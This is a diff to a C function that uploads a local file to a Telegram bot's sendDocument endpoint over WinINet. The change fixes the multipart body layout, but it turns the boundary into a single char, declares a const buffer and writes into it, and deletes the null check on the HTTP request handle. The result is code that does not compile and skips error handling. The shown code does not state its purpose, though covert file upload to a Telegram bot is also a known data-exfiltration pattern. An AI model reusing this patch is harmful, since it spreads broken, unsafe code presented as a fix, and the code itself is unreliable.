@@ -74,27 +74,26 @@ int send_telegram_file(const char* file_path) {
 	}
 	CloseHandle(hFile);
 
-	const char* boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
+	const char boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
 
-	const char* header[512];
+	const char header[512];
 	snprintf(header, sizeof(header), "Content-Type: multipart/form-data; boundary=%s", boundary);
 
-	char* request[1024];
+	char request[1024];
 	snprintf(request, sizeof(request), "--%s\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n%s\r\n--%s\r\nContent-Disposition: form-data; name=\"document\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", boundary, CHAT_ID, boundary, file_path);
 
-	char* end_boundary[256];
+	char end_boundary[256];
 	snprintf(end_boundary, sizeof(end_boundary), "\r\n--%s--\r\n", boundary);
 
-	DWORD reqHeaderLen = (DWORD)strlen(header);
-	DWORD readDataLen = (DWORD)strlen(request);
+	DWORD reqLen = (DWORD)strlen(request);
 	DWORD endBoundaryLen = (DWORD)strlen(end_boundary);
-	DWORD totalDataLen = reqHeaderLen + readDataLen + fileSize + endBoundaryLen;
+	DWORD totalDataLen = reqLen  + fileSize + endBoundaryLen;
 
 	char* post_data = (char*)malloc(totalDataLen);
 
-	memcpy(post_data, header, reqHeaderLen);
-	memcpy(post_data + reqHeaderLen, fileBuffer, fileSize);
-	memcpy(post_data + reqHeaderLen + fileSize, end_boundary, endBoundaryLen);
+	memcpy(post_data, request, reqLen);
+	memcpy(post_data + reqLen, fileBuffer, fileSize);
+	memcpy(post_data + reqLen + fileSize, end_boundary, endBoundaryLen);
 
 	HINTERNET hSession = InternetOpenA("WinTelegram", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
 	if (!hSession) {
@@ -110,12 +109,7 @@ int send_telegram_file(const char* file_path) {
 	char url_path[256];
 	snprintf(url_path, sizeof(url_path), "/bot%s/sendDocument", BOT_TOKEN);
 	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", url_path, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
-	if (!hRequest) {
-		InternetCloseHandle(hConnect);
-		InternetCloseHandle(hSession);
-		free(fileBuffer);
-		return -1;
-	}
+	
 	BOOL result = HttpSendRequestA(hRequest, header, (DWORD)strlen(header), post_data, totalDataLen);
 	free(fileBuffer);
 	free(post_data);
